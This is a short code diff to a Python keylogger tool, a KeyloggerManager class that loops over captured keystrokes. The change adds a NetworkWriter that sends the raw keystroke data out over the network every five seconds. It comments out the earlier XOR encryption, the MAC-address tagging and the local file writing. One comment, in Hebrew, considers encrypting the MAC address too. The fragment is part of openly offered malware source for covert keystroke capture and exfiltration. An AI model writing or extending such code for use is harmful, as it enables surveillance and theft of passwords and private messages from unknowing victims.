@@ -13,18 +13,22 @@ class KeyloggerManager:
         self.keylogger = KeyloggerService()
         self.encryptor = Encryptor()
         self.file_writer = FileWriter()
+        #
+        self.network_writer = NetworkWriter()
+        #
         self.main()
 
     def main(self):
         while self.active:
             data = self.keylogger.data
-            data = self.encryptor.xor(data)
-
+            self.network_writer.send_data(data)
+            # data = self.encryptor.xor(data)
+            # print(data)
             # אולי עדיף להצפין גם את הכתובת מאק
-            mac_name = self.get_mac_details()
-            wrapper = {mac_name : data}
+            # mac_name = self.get_mac_details()
+            # wrapper = {mac_name : data}
             #
-            self.file_writer.send_data(wrapper)
+            # self.file_writer.send_data(wrapper)
             time.sleep(5)
 
     @staticmethod
